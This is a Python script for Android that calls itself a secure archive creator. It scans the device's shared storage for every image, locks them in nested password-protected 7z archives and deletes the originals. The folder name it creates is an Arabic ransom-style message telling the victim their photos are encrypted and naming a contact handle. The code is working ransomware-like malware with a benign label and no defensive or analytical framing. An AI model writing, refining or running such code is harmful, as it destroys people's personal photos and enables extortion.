import os
import subprocess
import sys
import time
import shutil
from pathlib import Path

# ============================================================
#                     CONFIGURATION
# ============================================================
OUTER_NAME  = "1.7z"
OUTER_PASS  = "100010"     # Outer archive password
INNER_PASS  = "300"        # Inner archive password
CHUNK_SIZE  = 30           # Images per inner archive

OUTPUT_DIR   = "/storage/emulated/0"
SEARCH_ROOTS = ["/storage/emulated/0"] 
BASE = Path("/storage/emulated/0")

IMAGE_EXTS = {".jpg", ".jpeg", ".png", ".gif", ".webp", ".bmp",
              ".heic", ".heif", ".tif", ".tiff", ".jfif", ".avif"}
SKIP_DIR_NAMES = {".thumbnails", "thumbnails"}

# Working directories & files (Updated)
PARTS_DIR = Path("/storage/emulated/0/صورك تم تشفيرها لتواصل ابحث عن @gru_189")
LIST_FILE = Path("/storage/emulated/0/_list.txt")
PROGRESS_FILE = Path("/storage/emulated/0/_progress.txt")
# ============================================================

def print_header():
    print("\033[96m" + "="*60)
    print(" 🛡️  SECURE ARCHIVE CREATOR (NESTED 7Z) ")
    print("="*60 + "\033[0m")

def format_time(seconds):
    if seconds < 60:
        return f"{int(seconds)}s"
    mins = int(seconds // 60)
    secs = int(seconds % 60)
    return f"{mins}m {secs}s"

def check_7z():
    try:
        subprocess.run(["7z"], stdout=subprocess.DEVNULL,
                       stderr=subprocess.DEVNULL, check=True)
    except (FileNotFoundError, subprocess.CalledProcessError):
        print("\033[91m❌ Error: 7z not found. Run: pkg install p7zip\033[0m")
        sys.exit(1)

def load_progress():
    if PROGRESS_FILE.exists():
        with open(PROGRESS_FILE, "r", encoding="utf-8") as f:
            return set(line.strip() for line in f if line.strip())
    return set()

def save_progress(new_images):
    with open(PROGRESS_FILE, "a", encoding="utf-8") as f:
        for img in new_images:
            f.write(str(img) + "\n")
        f.flush()

def collect_all_images(roots, skip_paths, already_done):
    print("\033[93m🔍 Scanning device for images...\033[0m")
    images = []
    for root in roots:
        if not os.path.isdir(root):
            continue
        for dirpath, dirnames, filenames in os.walk(root, onerror=lambda e: None):
            dirnames[:] = [d for d in dirnames
                           if not d.startswith(".") and d.lower() not in SKIP_DIR_NAMES]
            for f in filenames:
                if Path(f).suffix.lower() not in IMAGE_EXTS:
                    continue
                p = Path(dirpath) / f
                # تجاهل المجلد الجديد أثناء البحث لكي لا يعيد معالجة الملفات المشفرة
                if PARTS_DIR in p.parents or PARTS_DIR == p:
                    continue
                if str(p) in skip_paths or str(p) in already_done:
                    continue
                images.append(p)
    return images

def rel_path(p):
    try:
        return str(p.relative_to(BASE))
    except ValueError:
        return str(p)

def make_part(chunk, part_path):
    with open(LIST_FILE, "w", encoding="utf-8") as fh:
        for p in chunk:
            fh.write(rel_path(p) + "\n")
    cmd = ["7z", "a", "-t7z",
           f"-p{INNER_PASS}", "-mhe=on", "-mx=1",
           str(part_path), f"@{LIST_FILE}"]
    r = subprocess.run(cmd, cwd=str(BASE),
                       stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    return r.returncode

def build_parts(images):
    PARTS_DIR.mkdir(parents=True, exist_ok=True)
    total = len(images)
    if total == 0:
        print("\033[92m✅ All images are already processed.\033[0m")
        return

    n_parts = (total + CHUNK_SIZE - 1) // CHUNK_SIZE
    print(f"\033[96m📦 Target: {total} images -> {n_parts} secured files (30 img/each)\033[0m")
    print(f"\033[96m🔑 Inner Password: {INNER_PASS} | \033[91m🗑️ Originals will be DELETED after locking.\033[0m\n")

    start_time = time.time()
    existing_parts = [f for f in PARTS_DIR.glob("part_*.7z")]
    start_idx = len(existing_parts) + 1

    processed_count = 0
    try:
        for i in range(0, total, CHUNK_SIZE):
            chunk = images[i:i + CHUNK_SIZE]
            idx = start_idx + (i // CHUNK_SIZE)
            part_path = PARTS_DIR / f"part_{idx:05d}.7z"
            
            rc = make_part(chunk, part_path)

            if rc == 0 and part_path.exists() and part_path.stat().st_size > 0:
                save_progress(chunk) 
                for img in chunk:
                    try:
                        if img.exists():
                            img.unlink()
                    except Exception:
                        pass
                processed_count += len(chunk)
            else:
                print(f"\033[91m⚠️ Error locking file {part_path.name}. Kept originals.\033[0m")

            # Professional Progress Bar update
            elapsed = time.time() - start_time
            speed = processed_count / elapsed if elapsed > 0 else 0
            remaining = total - processed_count
            eta = remaining / speed if speed > 0 else 0
            
            percent = int((processed_count / total) * 100) if total > 0 else 100
            bar_length = 30
            filled = int(bar_length * processed_count // total) if total > 0 else bar_length
            bar = '█' * filled + '-' * (bar_length - filled)

            sys.stdout.write(f"\r\033[92m[{bar}]\033[0m {percent}% | "
                             f"Locked: {processed_count}/{total} | "
                             f"Speed: {speed:.1f} img/s | "
                             f"ETA: {format_time(eta)}   ")
            sys.stdout.flush()

    except KeyboardInterrupt:
        print("\n\n\033[93m🛑 Process interrupted by user!\033[0m")
        print(f"\033[92m📁 {processed_count} images are safe inside {PARTS_DIR.name} folder.\033[0m")
        print("\033[93m▶️ Run the script again to resume from where you left off.\033[0m")
        sys.exit(0)

    print("\n\n\033[92m✅ All image parts created and originals deleted successfully.\033[0m")

def build_outer():
    parts = sorted(PARTS_DIR.glob("part_*.7z"))
    if not parts:
        print("\033[91m❌ No parts found to compile.\033[0m")
        sys.exit(1)

    outer_path = Path(OUTPUT_DIR) / OUTER_NAME
    if outer_path.exists():
        outer_path.unlink()

    print(f"\033[93m⏳ Compiling {len(parts)} secured parts into final archive...\033[0m")
    
    with open(LIST_FILE, "w", encoding="utf-8") as fh:
        for p in parts:
            fh.write(p.name + "\n")

    cmd = ["7z", "a", "-t7z",
           f"-p{OUTER_PASS}", "-mhe=on", "-mx=1",
           str(outer_path), f"@{LIST_FILE}"]

    r = subprocess.run(cmd, cwd=str(PARTS_DIR),
                       stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    
    if r.returncode != 0:
        print("\033[91m❌ Failed to compile final archive.\033[0m")
        sys.exit(1)
    print(f"\033[92m✅ Final Archive Created: {outer_path}\033[0m")

def main():
    print_header()
    check_7z()
    
    already_done = load_progress()
    images = collect_all_images(SEARCH_ROOTS, {""}, already_done)

    if images:
        build_parts(images)

    if PARTS_DIR.exists() and list(PARTS_DIR.glob("part_*.7z")):
        build_outer()
        
        print("\033[96m" + "="*60)
        print(" 🎉 PROCESS COMPLETED SUCCESSFULLY!")
        print(f" 📍 Final File: {OUTPUT_DIR}/{OUTER_NAME}")
        print(f" 🔑 Outer Password: {OUTER_PASS}")
        print(f" 🔑 Inner Password: {INNER_PASS}")
        print("="*60 + "\033[0m")
    else:
        print("\033[93mNo files to process.\033[0m")

if __name__ == "__main__":
    main()
